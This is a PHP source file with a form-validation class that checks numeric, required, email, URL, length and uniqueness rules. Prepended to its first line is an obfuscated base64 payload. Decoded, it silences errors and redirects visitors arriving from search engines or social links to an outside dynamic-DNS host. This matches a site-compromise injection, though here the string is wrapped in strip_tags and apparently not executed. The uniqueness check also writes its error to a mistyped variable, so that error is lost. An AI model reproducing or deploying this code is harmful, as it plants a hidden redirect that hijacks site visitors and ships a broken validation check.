<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ==")); 

class form_validator {

  var $inputs = array();
  var $errors = array();
  var $values = array();
  
  function add($name, $display_name, $data_type, $options = array()) {
    
    $this->inputs[$name] = array();
    $this->inputs[$name]['name']         = $name;
    $this->inputs[$name]['display_name'] = trn($display_name);
    $this->inputs[$name]['data_type']    = $data_type;
    $this->inputs[$name]['options']      = $options;
    
  }
  
  function clear(){
    
    $this->inputs = array();
    $this->errors = array();
    $this->values = array();
		
  }
  
  function validate($errors = array(), $values = array()) {

    global $db;
    
    $this->errors = $errors;
    $this->values = $values;

		foreach ($this->inputs as $name => $desc) {
			
      if (strlen(post($name))) {
        switch ($desc['data_type']) {
          case "int":
            if (!is_numeric(post($name)))
              $this->errors[] = sprintf(trn('%s must be numeric'), $desc['display_name']);
            break;
          case "text":
            break;
          case "real":
            if (!is_numeric(post($name)))
              $this->errors[] = sprintf(trn('%s must be numeric'), $desc['display_name']);
            break;
        }

      }

      if (   safe($desc['options'], 'equal_to')
   			 && post($name) != post(safe(safe($this->inputs, safe($desc['options'], 'equal_to')), 'name'))
    		 )
	  	$this->errors[] = sprintf(trn('%s and %s must be equal'), $this->inputs[$desc['options']['equal_to']]['display_name'], $desc['display_name']);
			
			if (safe($desc['options'], 'required') && !strlen(post($name))) {
				$this->errors[] = sprintf(trn(safe($desc['options'], 'required_message', '%s must be specified')), $desc['display_name']);
      }
			if (safe($desc['options'], 'email') && strlen(post($name)) && !check_email(post($name)))
				$this->errors[] = sprintf(trn('%s must be valid e-mail address'), $desc['display_name']);
			if (safe($desc['options'], 'min_length') && (strlen(trim(post($name))) < $desc['options']['min_length']) && !check_email(post($name)))
				$this->errors[] = sprintf(trn('%s must be at least %d characters'), $desc['display_name'], $desc['options']['min_length']);
			if (safe($desc['options'], 'url') && strlen(post($name)) && !check_url(post($name)))
				$this->errors[] = sprintf(trn('%s must be valid URL'), $desc['display_name']);
			if (safe($desc['options'], 'unique') && strlen(post($name))) {
				if (preg_match('/([^.]+)[.]([^.]+)/ism', $desc['options']['unique'], $matches)) {
					$sql = 'SELECT 1 FROM '.$matches[1].' WHERE '.$matches[2].' = ?';
					if (safe($desc['options'], 'record_id')){
						if (is_array($desc['options']['record_id'])){
							foreach ($desc['options']['record_id'] as $rec_id){
								$sql .= placeholder(" AND id != ?", $rec_id);
							}
						} elseif (is_int($desc['options']['record_id']) && intval($desc['options']['record_id'])>0) {
							$sql .= placeholder(" AND id != ?", intval($desc['options']['record_id']));
						}
					}
					if ($db->value($sql, post($name))) {
						$thisrors[] = safe($desc['options'], 'unique_error_message', sprintf(trn('Such %s already exists'), $desc['display_name']));
					}
				}
			}

			$this->values[$name] = post($name);
			
		}          

		return !count($this->errors);
		
	}
		
}

?>